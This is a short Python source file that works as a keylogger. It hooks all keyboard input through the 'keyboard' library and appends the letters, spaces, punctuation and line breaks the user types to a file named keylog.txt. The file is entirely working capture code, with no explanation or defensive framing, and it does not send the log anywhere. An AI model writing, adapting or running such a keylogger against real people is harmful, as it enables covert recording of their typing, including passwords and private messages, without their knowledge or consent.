import keyboard  
import os        


LOG_FILE = 'keylog.txt'

def on_key_press(event):
    key = event.name  
    
   
    if key.isalpha(): 
        with open(LOG_FILE, 'a') as f:
            f.write(key)
    elif key == 'space': 
        with open(LOG_FILE, 'a') as f:
            f.write(' ')
    elif key == ',':  
        with open(LOG_FILE, 'a') as f:
            f.write(',')
    elif key == '.': 
        with open(LOG_FILE, 'a') as f:
            f.write('.')
    elif key == '!':  
        with open(LOG_FILE, 'a') as f:
            f.write('!')
    elif key == '?':  
        with open(LOG_FILE, 'a') as f:
            f.write('?')
    elif key == 'enter':  
        with open(LOG_FILE, 'a') as f:
            f.write('\n')

    
 
    
keyboard.on_press(on_key_press)
keyboard.wait()  

